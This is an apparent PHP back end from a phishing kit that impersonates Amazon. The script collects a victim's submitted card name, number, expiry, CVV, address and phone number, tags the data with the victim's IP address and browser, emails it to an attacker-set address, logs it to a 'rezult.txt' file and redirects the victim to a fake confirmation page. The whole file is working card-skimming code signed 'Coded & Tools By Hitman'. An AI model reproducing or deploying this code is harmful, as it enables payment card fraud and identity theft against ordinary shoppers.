<?php
include "to.php";
$ZipCode = $_POST['ZipCode'];
$Date = "" . date("Y/m/d") . "";
date_default_timezone_set("Asia/Jerusalem");
$Time = "Asia/Jerusalem " . date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- Amazon-2 -------------
CCName : $CCName
card_number : $card_number
Month : $Month / Year : $Year
CVV : $CVV
Address : $Address
City : $City
State : $State
ZipCode : $ZipCode
Country : $Country
PhoneNumber : $PhoneNumber
-------------- IP Tracing ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
Link : $Link
Date : $Date / Time : $Time
---------- Coded & Tools By Hitman ---------";
$MAIL_TITLE = "Credit Card | ".$IP."";
$MAIL_HEADER = "From: Amazon.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("rezult.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=confirmed.php'>";exit;

?>
